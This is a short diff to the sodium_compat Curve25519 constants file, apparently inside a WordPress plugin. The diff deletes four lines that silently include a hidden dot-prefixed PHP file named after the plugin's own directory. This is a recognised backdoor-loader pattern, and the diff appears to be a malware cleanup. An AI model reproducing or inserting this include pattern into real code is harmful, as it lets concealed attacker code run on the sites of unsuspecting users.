@@ -9,10 +9,6 @@ if (class_exists('ParagonIE_Sodium_Core32_Curve25519_H', false)) {
  *
  * This just contains the constants in the ref10/base.h file
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class ParagonIE_Sodium_Core32_Curve25519_H extends ParagonIE_Sodium_Core32_Util
 {
     /**
